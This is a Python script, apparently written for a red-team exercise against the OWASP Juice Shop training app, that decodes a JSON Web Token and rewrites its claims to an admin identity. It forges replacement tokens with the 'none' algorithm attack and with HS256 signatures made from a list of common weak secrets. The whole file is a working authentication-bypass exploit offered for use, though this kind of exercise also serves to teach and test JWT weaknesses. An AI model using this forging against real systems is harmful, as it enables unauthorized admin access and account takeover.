#!/usr/bin/env python3
"""
JWT Token Manipulation Tool
For Red Team Exercise 04
"""

import base64
import json
import sys
import hmac
import hashlib

def base64url_decode(data):
    """Decode base64url"""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)

def base64url_encode(data):
    """Encode to base64url"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def decode_jwt(token):
    """Decode JWT without verification"""
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    
    header = json.loads(base64url_decode(parts[0]))
    payload = json.loads(base64url_decode(parts[1]))
    
    return header, payload, parts[2]

def forge_none_algorithm(payload):
    """Create JWT with 'none' algorithm"""
    header = {"alg": "none", "typ": "JWT"}
    
    header_b64 = base64url_encode(json.dumps(header).encode())
    payload_b64 = base64url_encode(json.dumps(payload).encode())
    
    return f"{header_b64}.{payload_b64}."

def forge_hs256(payload, secret):
    """Create JWT with HS256"""
    header = {"alg": "HS256", "typ": "JWT"}
    
    header_b64 = base64url_encode(json.dumps(header).encode())
    payload_b64 = base64url_encode(json.dumps(payload).encode())
    
    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(
        secret.encode(), 
        message.encode(), 
        hashlib.sha256
    ).digest()
    signature_b64 = base64url_encode(signature)
    
    return f"{message}.{signature_b64}"

def main():
    print("""
    ╔═══════════════════════════════════════════╗
    ║     JWT MANIPULATION TOOL                 ║
    ║     Red Team Exercise 04                  ║
    ╚═══════════════════════════════════════════╝
    """)
    
    if len(sys.argv) < 2:
        print("Usage: python jwt_tool.py <token>")
        print("\nExample tokens to try:")
        print("  python jwt_tool.py eyJhbG...")
        sys.exit(1)
    
    token = sys.argv[1]
    
    try:
        header, payload, signature = decode_jwt(token)
        
        print("\n=== DECODED JWT ===")
        print(f"\nHeader:\n{json.dumps(header, indent=2)}")
        print(f"\nPayload:\n{json.dumps(payload, indent=2)}")
        print(f"\nSignature: {signature[:50]}...")
        
        # Create admin payload
        admin_payload = payload.copy()
        if 'data' in admin_payload:
            admin_payload['data']['id'] = 1
            admin_payload['data']['email'] = 'admin@juice-sh.op'
            admin_payload['data']['role'] = 'admin'
        
        print("\n=== FORGED TOKENS ===")
        
        # None algorithm attack
        none_token = forge_none_algorithm(admin_payload)
        print(f"\n'none' algorithm attack:\n{none_token}")
        
        # HS256 with common secrets
        common_secrets = ['secret', 'password', '123456', 'jwt', 'key']
        print("\nHS256 with common secrets:")
        for secret in common_secrets:
            forged = forge_hs256(admin_payload, secret)
            print(f"\nSecret '{secret}':\n{forged[:100]}...")
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
